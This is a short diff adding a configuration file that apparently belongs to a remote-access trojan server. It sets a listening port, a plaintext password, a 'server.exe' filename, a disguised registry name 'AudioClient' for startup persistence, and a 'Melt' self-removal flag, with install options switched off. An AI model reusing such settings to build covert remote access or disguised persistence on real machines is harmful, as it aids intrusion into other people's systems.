@@ -1,0 +1,13 @@
+[Connection]
+Port=1515
+Password=pass
+Directory=1
+IPs=
+[Installation]
+Install=0
+Startup=0
+HKCU=0
+Filename=server.exe
+HKCUName=AudioClient
+[Additional]
+Melt=0
